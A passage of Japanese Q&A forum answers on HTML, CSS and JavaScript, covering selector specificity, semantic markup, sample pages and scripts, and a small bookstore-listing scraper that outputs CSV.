href="/01.html">最初のページ</a></li> ＿＿＿＿<li><a href="/02.html">次のページ</a></li> ＿＿＿＿<li><a href="/03.html">ゴオグル</a></li> ＿＿＿＿<li><a href="/04.html">ゴオグルログイン画面入り口</a></li> ＿＿＿＿<li><a href="/05.html">テストだよ</a></li> ＿＿＿</ul> ＿＿</nav> ＿</header> ＿<section> ＿＿<aside> ＿＿＿<h3>Something aside</h3> ＿＿</aside> ＿＿<h2>A smaller heading</h2> ＿＿<p> ＿＿</p> ＿</section> ＿<section> ＿＿<h2>A smaller heading</h2> ＿＿<p> ＿＿</p> ＿</section> ＿<footer> ＿＿<h2>A nice footer</h2> ＿</footer> </body> </html>
そのサーバーの負荷が重いんじゃないの？ あなた専用のサーバーを借りているわけでは無いんでしょ。
p{}だと詳細度は、タイプセレクタだけですので(001)ですが、より詳細度の高い指定や、同じ詳細度で後で指定されているもので上書きされていませんか？ 　例えばクラスセレクタ--詳細度(010) 　!importantを付けるという奥の手もありますが、それはユーザーの指定を拒否するので、視覚弱者に対して優しくないので使用しないほうが良いでしょう。 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　はスタイルシート扱うときに絶対に必要な基礎知識です。マスターしましょう。
.hentry img, .entry-content img, .widget img --グループ化--の意味はわかっていますか？ .はクラスセレクタで、属性セレクタと同様詳細度は{0,0,1,0}ですが、より詳細度の高い設定がありませんか？ .hentry img,　　(0,0,1,1) .entry-content img,(0,0,1,1) .widget img　　　(0,0,1,1) ＞この質問がされたのがもう1年以上前ですので、また、変わったのかもしれません. 　「また、変わったのかも」そんな嘘どこから？ 　クラスセレクタは1999年勧告のCSS1以来変わっていません。スタイルシートの書き方は、当時から16年経ち進化していますが、変更は基本的にありません。以前の仕様と矛盾しないように拡張されている。 　例えば .hentry img{}は現在(CSS2以降)は、p.hentry img{}のように基点となるセレクタを書くべきとされていますが、ない場合は*.hentry img{}と見なされ、かつ*は省略できることになっていますから、.hentry img{}と記述しても、*.hentry img{}と解釈されます。 5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) の二つは、Cascading Style Sheets Level 2 Revision 1 (CSS 2.1) Specification 日本語訳( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )でもプロパティより先に書かれていると手も重要な部分です。ここを完璧に理解しましょう。 　なお、ウェブ開発されてるのでしたら、開発者向けツール( https://addons.mozilla.jp/firefox/extensions/dev … )の多いfirefoxをお使いだと思いますが、そのfirebugを使用すると、スタイル指定がどのように関わっているかが一目瞭然です。
#1です。 曲線を含む複雑な不定多角形のイメージマップを手動で入力してる人なんて、まずいないと思います。 必ずなんらかのツールを使ってるはず。 質問者さんも言ってるように、それこそ気の遠くなるような作業で、あまりにも非現実的ですからね。 リンク範囲を色分けするにはJavaScriptによるロールオーバーなども公開されてますね。 http://www.webcreator-net.com/tips_memo/javascri … 上記は手動入力なので複雑な形には不向きですが。
フレームを使わないということは、スライドショーではなく一つのページで一部のコンテンツを指定した範囲内に表示したいということですか？ HTML自体は、普通に、HTMLを書いていくだけです。 <body> 　<div class="header"> 　　<h1>見出し</h1> 　　<div class="menue"> 　　　<ul><!-- 画像リスト --> 　　　　<li><img src="" width="" height="" alt=""></li> 　　　　<li><img src="" width="" height="" alt=""></li> 　　　　<li><img src="" width="" height="" alt=""></li> 　　　</ul> 　　</div> 　</div> 　<div class="section"> 　　<h2>本文</h2> として、 div.header div.menue{ width:80%; margin:0 auto; overflow:hidden; position:relative; } div.header div.menue ul, div.header div.menue ul li{ list-style:none; mardin:0; padding:0; } div.header div.menue ul li{ display:inline-block; } div.header div.menue ul li img{ width:50%; height:auto; } とか・・
難しいことばかり勉強しないで、基礎を勉強してください。 一つだけ教えると「ＰＲＥ」を使う。
サクラエディタを使用しています。 フリーソフトで多機能なのでおすすめです。 ・タブ表示 ・検索文字のハイライト ・マクロ機能（自動処理） ・矩形（くけい）選択 などの機能があります
私は一時ＣＳＳで統一書式にしてみましたが、 イメージが固まってしまって変化のない様式になってしまって、 結局コピーしてそれを貼りつけて一部修正し変化を持たせるということにしました。 文の中ではＨＴＭＬ、ＣＳＳ、ＪＡＢＡすべて組み合わせたほうがいいでしょうね。 手打ちといっても大概は最初作ったページを変化していくだけですから、 手間はそんなに違いませんよ。
ブラウザで保存したファイルを開けばいいだけです
システム開発会社のインハウス・デザイナーさんですか？ あるいは上司さんがシステム開発会社出身？ ここに集まっている連中は、PGやコーダばっかりで、おそらくあなたの上司と同じか、より融通の効かない答えしか出ませんよ。 PhotoshopやIllustrator、Fireworksと聞いただけで拒否反応が出ますんで。 自分は以前、（某中堅）デザイン広告会社の中でシステム開発を行っていたので、立場は主さんとまるっきり真逆ですが、あちらの業界では「要件定義書」とか「システム仕様書」を作っても、顧客も含め、誰も見ません。 いきなり「まずビジュアル」「完成品を持ってこい」「仮のデザインじゃわからん」です。 画面詳細設計仕様書は、下請に出す場合の見積必要書類でしたね。 自分がシステム担当した理由も、そもそもシステム開発会社に外注する仕様書が誰も作れず、何とか開発にこぎつけても、詳細変更時のトラブルばっかりで、収拾がつかなくなったことが原因です。 「郷に入らば郷に従え」じゃないですが、業界文化とか、企業文化のようなものがあって、Webのように「異種格闘技」のような世界だと、属している世界に従うしかないというのが正直な話です。 あなたの上司さんと、あなたのどちらが正しいかは、会社のスタンスによって決まります。 なので、本当に正直に言うと、「システム開発会社のインハウスデザイナ」とか「広告会社の中のSE」は、当初は重宝がられる存在でも、所詮長続きはしないと思いますよ。
疑似的なものはありますが、完全なものは無理です。 ftpはもともとファイル転送するために作られたものなので、ディレクトリ中のファイル一覧を得る方法が用意されています。 ですが、HTTPには、そのようなものはありません。 リクエストのあったURLに対して、正常か異常か、しか判断できません。 HTMLを取得 →中身を解析して、a href=〜 や img src=〜 等から関連するURL一覧を作成 という手法で、擬似的に「全URL」を得るものはあります。 ですが、この方法では、本当の全URLを得ることはできません。 例えば、 b.html が無い場合、 本当に b.html が存在しないのか、それとも単にリンクが貼られてないだけなのか、判断できません。 また、そもそも、「ファイル」なのかも判断できません。 例えば、この質問のURL は https://oshiete.goo.ne.jp/qa/8987891.html ですが、 「osiete.goo.ne.jp」サーバーの「qa」ディレクトリの「8987891.html」というファイル が存在するとは、とても思えません。 ですが、外からでは、否定も工程もできません、
暦の処理は面倒ですが、特定の業界では必須知識なのでがんばりましょう。 とくにこだわりが無ければ、カシオが提供しているサイトの「年齢早見表」で事足ります。 http://keisan.casio.jp/ HTML だけで計算したいならば、以下サンプルです <form name=calcAge> <p>年齢: <input type=number name=a> <button type=submit>計算</button> <dl> <dt>西暦<dd><output name=gc></output> <dt>和暦<dd><output name=jc></output> <dt>干支<dd><output name=sc></output> </dl> </form> <script>(function(){_=0; addEventListener('submit', function(ev){ _ ; var form = ev.target; _ ; if (form.name == 'calcAge') ev.preventDefault(), calcAge(form); }, false); function calcAge(form) { _ ; var elems = form.elements; _ ; var age = parseInt(elems['a'].value); _ ; var date = new Date(); _ ; date.setFullYear(date.getFullYear() - age); _ ; elems['gc'].value = get西暦の年(date); _ ; elems['jc'].value = get和暦の年(date); _ ; elems['sc'].value = get干支の年(date); } function get西暦の年(date) { _ ; var y = date.getFullYear(); _ ; return (y > 0)? '%年'.replace(/%/, y): '紀元前%年'.replace(/%/, 1-y); } var 十干の定数 = '庚辛壬癸甲乙丙丁戊己'.split(''); var 十二支の定数 = '申酉戌亥子丑寅卯辰巳午未'.split(''); function get干支の年(date) { _ ; var year = date.getFullYear(); _ ; if (year < 0) year = 60 + year % 60; _ ; return 十干の定数[ year % 10 ] + 十二支の定数[ year % 12 ]; } var 元号の定数 = (function(){ _ ; var res = [], x = '明治/18681023,大正/19120730,昭和/19261225,平成/19890108'.split(/,/).reverse(); _ ; for (var i = 0; i < x.length; i++) { _ ; _ ; var o = x[i].split('/'); _ ; _ ; var n = parseInt(o[1], 10); _ ; _ ; var y = n / 10000 | 0; _ ; _ ; var t = new Date(y, ((n/100|0)%100)-1, n%100); _ ; _ ; res.push({ year:y, first:t, name:o[0] }); _ ; } _ ; return res; })(); function get和暦の年(date) { _ ; function E(o, y) { return '%%年'.replace(/%/, o.name).replace(/%/, (y - o.year == 0)? '元': 1 + y - o.year) } _ ; var res = [], year = date.getFullYear(); _ ; for (var i = 0; i < 元号の定数.length; i++) { _ ; _ ; var o = 元号の定数[i]; _ ; _ ; if (o.year <= year) res.unshift(E(o, year)); _ ; _ ; if (o.year < year) break; _ ; } _ ; return (res.length == 0)? '不明': res.join(' / '); } })()</script> 日本では明治6年より前は太陰暦なので、ちゃんと対応するならば考慮が必要です。 また以下の法律がある限り、和暦の計算方法は変更され続ける前提なので注意しましょう。 参考) 元号法 / 元号を改める政令 http://law.e-gov.go.jp/htmldata/S54/S54HO043.html http://law.e-gov.go.jp/htmldata/S64/S64SE001.html
項目数がそう多くないのならば、スクリプトだけで表示を制御するのが、一番スムーズだと思います。 以下サンプルです。 <nav class=menu data-menu-pagesize=10> <ul> <li> 1 <li> 2 <li> 3 <li> 4 <li> 5 <li> 6 <li> 7 <li> 8 <li> 9 <li> 10 <li> 11 ... </ul> </nav> <!-- HTML5 / 初期は最新10件のみ表示 / 必要なら前後リンクを自動生成 --> <script>addEventListener('DOMContentLoaded',function(ev){_=0; function A(a){return Array.prototype.slice.apply(a)} function styleMenu(nav, delta) { _ ; function makeAnchor(txt, cmd) { _ , _ ; var e = document.createElement('a'); _ , _ ; e.textContent = txt; _ , _ ; e.href = cmd; _ , _ ; e.addEventListener('click', function clicker(ev) { _ , _ , _ ; var cmd = ev.target.getAttribute('href'), nav = ev.target.parentNode; _ , _ , _ ; if (cmd == '#menuPrev') ev.preventDefault(), styleMenu(nav, -1); _ , _ , _ ; if (cmd == '#menuNext') ev.preventDefault(), styleMenu(nav, +1); _ , _ ; }, false); _ , _ ; return e; _ ; } _ ; var num = parseInt(nav.dataset.menuPagesize); if (!num) num = 10; _ ; var index = delta + parseInt(nav.dataset.menuIndex); if (!index || index < 0) index = 0; _ ; var items = A(nav.querySelectorAll('ul > li')); _ ; var a = index * num, b = a + num, c = items.length; _ ; items.forEach(function(li, i){ li.style.display = (a <= i && i < b)? 'list-item': 'none' }); _ ; A(nav.querySelectorAll('a')).forEach(function(e){e.parentNode.removeChild(e)}); _ ; if (0 < a) nav.appendChild( makeAnchor('前の'+num+'件', '#menuPrev') ); _ ; if (b < c) nav.appendChild( makeAnchor('次の'+num+'件', '#menuNext') ); _ ; nav.dataset.menuIndex = index; } A(document.querySelectorAll('nav.menu')).forEach(function(nav){styleMenu(nav, 0)}); },false)</script>
セレクトボックスの連動ですよね？ 汎用化したものを創っている方がいらっしゃいますので、そういったものを利用した方がてっとり速いのではないでしょうか？ （他にもあると思いますが、とりあえず知っているものを…） 　http://d.hatena.ne.jp/Mars/20071109
実務に勝る学習方法はありません。 HTML5は難しいので、HTML4.01---ただしstrict---、CSS2.1あたりから始めるほうが楽でしょう。 こういうときは、どうマークアップするか それをこのように表現するにはスタイルをどう指定すればよいか・・ 繰り返しては、判らないと仕様書を確認する。
ブラウザを用いたそのようなシステムは、汎用性があるために現在ではとても多く使われています。インターネットだけでなくイントラネット--ローカルネットワーク、あるいは自陣のパソコン内だけでも・・。 　ウェブ開発をされていると、絶対に必要なテスト環境としてapachなどのローカルサーバーをお持ちだと思いますが、それをそのまま使えば良いです。 http://127.0.0.1/input.html とか、 　http://loacl.host/input.html とか・・ 　http://192.168.192.168/user/input.html とかね。 1) ローカルサーバーをインストール apacheなど 　192.168.192.168のパソコンにインストールするのが楽でしょう。 　そのデータのある場所をCGIから見えるようにします。 　(例) LAN内のパソコンから、http://192.168.192.168/ でアクセスできるよう、そのパソコンのサーバーを設定します。 　　判りやすいサーバー名をつけておくと良いです。hostsファイルを書き換える。 2) フォームはどこにあっても構いません。 　　サーバー名をつけたのでしたら、それでアクセスできるようにルーターないし、各パソコンのhostsを書き直します。 　あとは通常のCGIの開発と同じです。 ★共有ホルダーである必要はありません。 ★HTTPサーバーと、そのサーバーがネットワーク上で見つかるようにする 　それ以外--CGIとかフォームの作成は、通常のウェブ開発と変わりません。 　私は、パスワード生成のために小さな物おいています。いつ、何の目的で、どんなパスワードを作ったかが一覧で参照できる。
HTMLとブラウザのjavascriptだけで行おうとすると無理があります。 単純にローカルサーバーを使ってCGIのように動作させるのが簡単ですよ。 プログラムが扱えるなら、cでもPerlでもサーバーを使わず出来ますが圧倒的に情報量が違うので・・
お店のウェブサイトとなると個人サイトと異なり、半ば公的な性格も持つし、様々な端末での利用も、SEOも考えないとならないので、シンプルにHTMLを書いてjavascriptで処理するのがベストでしょう。簡単ですし・・ 例えば、スタッフ紹介のページだとすると、それがメインのコンテンツでしょうから。。 <div class="staffList"> 　<ul> 　　<li>店長 　　　<ol> 　　　　<li><a href="./photo/a2.jpg" onClick=""><img src="./photo/a1.jpg" width="" height="" alt=""></a></li> 　　　　<li>年齢</li> 　　　　<li></li> 　　　</ol> 　　</li> 　　<li>店舗責任者 　　　<ol> 　　　　<li></li> 　　　　<li></li> 　　　　<li></li> 　　　</ol> 　　</li> とかだと思います。 　スタイルシートで、マウスオーバーすれば、a2の画像を表示しクリックすれば、a2に飛びますがjavascriptが有効なブラウザなどではリンクを止めて画像をそのページに表示するようにすれば良いだけです。javascriptが使えない携帯や印刷、検索エンジンにはそのまま利用できますし。 　そもそもとても簡単になるでしょう。
どんなエディターを使っても同じですが、 <head>から</head>の間に不備があるため <body>以下が表示されない状況と推測します。 ちゃんと落ち着いて見直しましょう
まだ懲りてなかったのか。
/* 以降はスタイルシートですから、head内もしくは、外部スタイルシートに書きます。 tableを使わないと、色々良いことがあります。 幅が固定されませんから、スマホでも閲覧できます。 デザインをHTMLを弄らずに先で任意に変更できます。 　例えば、画像をfloatさせて文章を回り込ませるとか、サイズを変更するとか・・ 　tableを使う限り、どんなに指定しても隙間は消えないでしょう。tableは配置のためではなく、二次元データを並べる表(table）なのです。 ＞ホームページビルダー１８を使用しているのですが、 　Webオーサリングツールを使うためには、テキストエディタで記述する人以上にHTMLやスタイルシートの知識が必要です。【決して逆じゃないです。】 　まっとうなWebオーサリングツールは、必ずHTML/CSSの知識が必要と書いてある。 　その上で、それぞれのツールの癖、長所・欠点を知らなければならないので、膨大なマニュアルも読まなきゃならない。 　そうしないと、『作成したウェブサイトの影響( http://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC% … )』に書かれているような問題が起きてしまう。 わかりやすい簡単なサンプルです。 ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 　で検証済みのHTML4.01strict＋CSS2.1です。 　どのブラウザでも同じに表示されます。 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951&#64;hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;background-color:lime; } h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} a img{border:none;} div.header,div.section,div.footer{ width:90%;min-width:470px;max-width:900px; margin:0 auto; padding:5px; position:relative; } table[summary="写真"]{/* summaryを使うほうが後々楽 */ border-collapse: collapse; border:0; border-spacing:0; } table[summary="写真"] td,table[summary="写真"] th{ border:0; font-size:0; } table[summary="写真"] img{ font-size:14px;/* 画像が読取れないとき代替文字(alt)のサイズ*/ vertical-align:top; } /* ここからtable使わない */ div.section p.album a{ text-decoration:none; } div.section p.album{ text-indent:0; text-align:center; font-size:0; } div.section p.album img{ width:45%; height:auto; min-width:360px; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>定時に発車した電車は、５分ほどの善光寺下駅から地上を走るが、意外に市街地が広かった。郊外の風景になるのは20分ほどして千曲川を渡ってからだった。</p> ＿＿<table summary="写真" border="1"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<td><img src="ob012.jpg" width="450" height="337" alt="abcの風景"></td> ＿＿＿＿＿<td><img src="ob013.jpg" width="450" height="337" alt="バスケット"></td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td><img src="ob014.jpg" width="450" height="337" alt="efg"></td> ＿＿＿＿＿<td><img src="ob015.jpg" width="450" height="337" alt="テスト"></td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>定時に発車した電車は、５分ほどの善光寺下駅から地上を走るが、意外に市街地が広かった。郊外の風景になるのは20分ほどして千曲川を渡ってからだった。</p> ＿＿<p class="album"> ＿＿＿<img src="ob012.jpg" width="450" height="337" alt="abcの風景"> ＿＿＿<img src="ob013.jpg" width="450" height="337" alt="バスケット"> ＿＿＿<img src="ob014.jpg" width="450" height="337" alt="efg"> ＿＿＿<img src="ob015.jpg" width="450" height="337" alt="テスト"> ＿＿</p> ＿＿<p> ＿＿＿ tableを使わないと、スマホでも問題ないでしょ。ウィンドウ幅を小さくしてみてご覧なさい。 ＿＿</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
YouTubeにあるHTMLを勝手に変えるようなことはできません。 それって、いわゆる「不正アクセスによる改竄」になりますよ。
XHTMLは、いまさら学習する必要は無いと思いますが、HTML4.1を知っているなら学習コストは低いので気になるなら勉強してもいいでしょう。 ＞JavaScriptとHTML5+CSS3も覚えたいと思っています。 並行して勉強すれば良いのでは？悩む必要は無いです。
HTMLがちゃんとしていなかったらスタイルシートは書けません。 『メモ: CSSスタイルシートを意図した通りに機能させるには、正しい文書解析木が必要です。つまり、正当なHTMLを用いるべきです。( http://jigsaw.w3.org/css-validator/#validate_by_ … )』 ★dl要素には、dtとdd以外は含むことが出来ません。 　<!ELEMENT DL - - (DT|DD)+ -- definition list --> 　の意味はわかってますよね。 　<!-- DL 要素 -開始タグ必須　-終了タグ必須 (DT|DD)+ DTかDLひとつ以上 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) DOMを書くと、 div　　　　　id="tab" 　|-- dl　　　id="tab1"> 　|　　|-- dt 　|　　|　　|-- a 　|　　|-- dd 　|　　|-- dl　 id="tab2"> 　|　　|　　|-- dt 　|　　|　　|　　|-- a HREF="#tab2" 　|　　|　　|-- dd 　|　　|　　|-- dl　 id="tab3" 　|　　|　　|　　|-- dt 　|　　|　　|　　|　　|-- a 　|　　|　　|　　|-- dd こんなHTMLだと、ブラウザはそのタグを【適当に】補完してなんとか表示しようとするのでブラウザ間で誤差が出てきたり、スタイルシートがうまく機能しなくなります。 ★DIVは、『id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』のもので、このように 『id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』のもので、tab、tab1、tab2なんてつけないし、そもそも、HTML5では安易にDIVは使えなくなります。 ★<a HREF="#tab1"></a>内容がありません。表示しないにしても適切な内容が必要 　検索エンジンは無論、スタイルシートを利用できないブラウサでは？？ ★DLは定義リストです。 [サンプル] <div class="header"> 　<div class="nav"> 　　<ul> 　　　<li><a href="#">メニュー</a> 　　　　<ul> 　　　　　<li><a href="#">サブメニュー</a></li> 　　　　　<li><a href="#">サブメニュー</a></li> 　　　　　<li><a href="#">サブメニュー</a></li> 　　　　　<li><a href="#">サブメニュー</a></li> 　　　　</ul> 　　　</li> 　　　<li><a href="#">メニュー</a> ・・・【中略】・・・ 　　　</li> 　　</ul> 　</div> </div> <div class="section"> ・・・・ここから下は、文書構造が読取れないので書けない。 なお、HTML5だと <header><!-- 文書のヘッダ --> 　<nav><!-- ナビゲーション --> 　　<ul> 　　　<li><a href="#">メニュー</a> 　　　　<ul> 　　　　　<li><a href="#">サブメニュー</a></li> 　　　　　<li><a href="#">サブメニュー</a></li> 　　　　　<li><a href="#">サブメニュー</a></li> 　　　　　<li><a href="#">サブメニュー</a></li> 　　　　</ul> 　　　</li> 　　　<li><a href="#">メニュー</a> ・・・【中略】・・・ 　　　</li> 　　</ul> 　</nav> </header> <section><!-- 本文 -->
「ＵＲＬからページの情報抽出 - HTML | 教えて！goo」 https://oshiete.goo.ne.jp/qa/8962642.html のNO.1の回答で紹介されているブックマークレットなら、 次のような結果になります。 864,9784834023909,当日～3日で出荷予定（ネットストア在庫）,"あ こどものとも絵本" 681,9784890081950,現在ご注文いただけません,"あ うれしくなるちいさなはなし" 1944,9784817039873,当日～3日で出荷予定（ネットストア在庫）,"感じる!絵手紙勉強法 自分らしさを求めて" 以下略 ブックマークレットの作り方は、 適当に新しいブックマークレットを作って、 右クリックのプロパティーで開いたウインドウで、 URLの欄にjavascript:で始まる紹介されている長いスクリプトをコピーするだけです。 後は、該当のページを開いて作ったブックマークレットをクリックして表示された結果をどこかにコピーしてください。
/[^0-9\uFF10-\uFF19]+/
誤: id属性は1ページに1度だけしか使用できない 正: ページ内のid「属性値」は、すべて異なる値を使用する
そのようなツールが欲しいなら自分で作るものです。 以下 Windows7 で動く CSV を作成するまでのサンプル --- getjunkudo.wsf で保存 <?XML version="1.0" standalone="yes" ?> <package><job id="getjunkudo"><object id="xhr" progid="MSXML2.XMLHTTP" /> <script language="JavaScript"><![CDATA[(function(){ var a = WScript.arguments; if (a.count() < 1) WScript.quit(1); var url = a.item(0); xhr.open("GET", url, false); xhr.send(null); if (xhr.readyState != 4 || xhr.status != 200) WScript.exit('status = ' + xhr.status); var html = xhr.responseText, doc = WScript.CreateObject("htmlfile"); doc.open('text/html'); doc.write(html); doc.close(); var csv = [], items = doc.getElementsByTagName('div'); for (var i = 0; i < items.length; i++) { var item = items.item(i); if (item.className != 'product_list_content_1line') continue; var T = function(s) { var e = item.getElementsByTagName(s).item(0); return e.innerText.replace(/^\s+|\s+$/g,'').replace(/\s+/g,' '); } var t = T('h3'), p = T('p'), x = T('h5'); var u = '"' + t.replace(/"/g,"'") + '"'; var v = p.match(/([\d,]+)円/)[1].replace(/,/,''); var s = p.match(/ISBN\s+(\w+)/)[1]; var y = x.replace(/^.*(お取り寄せ|翌日出荷予定|翌日.+日で出荷予定|現在ご注文いただけません).*$/,'$1'); csv.push([u,v,s,y].join(',')); } WScript.echo(csv.join('\n')); })()]]></script> </job></package> --- コマンドプロンプトでの実行方法 cscript.exe getjunkudo.wsf http://www.junkudo.co.jp/mj/products/list.php?se …
HTML5,HTML4.01ですね。Hyper Text Markup Language の頭文字なので大文字です。この世界大文字か小文字で示すものが異なるものが多いので・・ 　よく御存知のようですが、一部誤解があるようです。 >有名サイトのソースを見てみると、 　有名か否かは判断の基準にはならないでしょう。 >宣言だけ<!DOCTYPE html>として、 　これはすでにHTMLの文書宣言としての用途はありません。DTDを使用しなくなった。 　この目的は、ブラウザが標準モードで動作するためのDOCTYPEスイッチの役をするだけです。 >divで書いてあったりするのをよく見かけて、 　ブラウザに対しては、過去との互換性を保つことが求められていますから、divを使うこと自体は誤りではありませんが、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから NOTE: Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of more appropriate elements instead of the div element leads to better accessibility for readers and easier maintainability for authors. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.4 Grouping content — HTML5( http://www.w3.org/TR/2014/REC-html5-20141028/gro … )］ 　(著者は、他により適切な要素ないときの最後の手段としてdiv要素を使用することを強く推奨する。div要素に代わってより適切な要素を使用する事は、読者には「より良いアクセシビリティ」を、著者には、「より容易なメンテナンス性」につながる。) 　articleやheader、section要素を使用せずに、divで括られていることを問題にされているのですね。 　⇒HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (1/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/n … ) 　の２ページ目の『文書内に埋め込まれた「意味」を明確にする』あたり 　実は、これはHTML4.01の時代(1999年)からすでに方法は、明確に示されていました。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 >divで書いてあったり 　したとしても、<div class="header">,<div class="section">と文書構造を示すために使われているのでしたら、SEO的には問題はないはずです。 ★googleはこのような文書構造を示すclass名やidは理解しているようです。★ 　もし、デザインなど文書構造を示す意味のないものが使用されているとしたら、HTML5どころか、HTML4.01にも反しているわけですから >有名サイトのソース 　に関わらず参考にする意味はないということですね。残念ながら酷いものが多いです。多くの人が利用するので検索順位は上位に表示されますが、本来のSEO的に優れているわけではありません。 >まだまだ個人のブラウザの移行も遅いようで、 　二つの選択肢があります。 ・HTML5で記述して、html5.js、またはhtml5shiv.js をつかって要素として認識させる。 ・HTML4.01strictで作成し、文書構造はdiv要素とclass名を併用する。 　の何れかになるでしょう。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> ・・・・ <body> 　<div class="header"> 　</div> 　<div class="section"> 　　<div class="section"> 　　</div> 　　<div class="section"> 　　　<div class="aside"> 　　　</div> 　　</div> 　</div> 　<div class="footer"> 　</div> </body> または <!doctype html> <html> <head> ・・・ 　<!--[if IE]> 　　<script src="http://html5shiv.googlecode.com/svn/trunk/html5. … 　<![endif]--> </head> <body> 　<header> 　</header> 　<section> 　　<section> 　　</section> 　　<section> 　　　<aside> 　　　</aside> 　　</section> 　</section> 　<footer> 　</footer> </body> 　これで、HTMLによって文書構造はマークアップされていますし、相互に変換もツールを使えばできます。 ★大事な事は、HTMLは文書構造を示すものであることであってプレゼンテーションに関わるものはスタイルシートを利用する。 HTML4.01 (構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )) 　これでSEO（検索エンジン最適化=検索エンジンにページの内容が正確に伝わるようにする）対策はできます。
背景画像は文書の内容ではありませんのでHTMLには書きません。 【以下理由】 background　は 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから background = uri [CT] 　★推奨しない。 　この属性の値は、画像資源を指し示すURIである。この画像は一般に、視覚系ブラウザで背景に敷き詰められる。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 『推奨しない要素は、HTMLの将来のバージョンでは廃止になる可能性がある。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 ・・・・ background属性は、XHTML1.1以降、XHTML2.0(中止)、HTML5では廃止されています。 ＞下記は現在ホームページビルダーで作成しているHTMLです。 　困ったな「国内のウェブサイトにおける非互換要因の一つとして、ホームページ・ビルダーの名前が調査書の中で挙がっている( http://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC% … )」とあるように・・。 　ウェブページを作成する時にHTML/CSSの知識は必須です。特にビルダーのようなWebオーサリングツールを使用するときは、テキストエディタで作成する人以上に、それらの知識が必要です。そうしないと上記のような問題が発生する。 　決して、HTML/CSSの知識がなくても製作できるということはありません。逆です。 サンプル ・Another HTML Lint Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　で検証済みのHTML4.01strict + CSS2.1+ 一部CSS3・・・ウェブ標準です。 　<doctype>宣言は下記のように記述するとブラウザ間の誤差はほぼなくなります。 ・タブは＿に置換してあるので戻す。 ★HTMLには文書構造しか書かれていないためにデザインは自由に変更できます。 　構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　は、15年前の1999年のHTML4.01の勧告以来重要なポイントです。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951&#64;hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html{/* HTMLの背景 */ background-image:url(./image1.png); background-repeat:no-repeat; background-size:cover;/* CSS3 背景で全体を覆う */ } body{ background:url(./image2.png) no-repeat 50px 100px;/* まとめてもOK */ } div.header h1{/* h1の背景 */ background:url(./image3.png) no-repeat; overflow:hidden; text-indent:-10em; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>本文はsection</p> ＿＿<div class="section"> ＿＿＿<h3>項見出し</h3> ＿＿＿<p>本文項記事</p> ＿＿＿<p>sectionの階層でレベルが判断される</p> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> 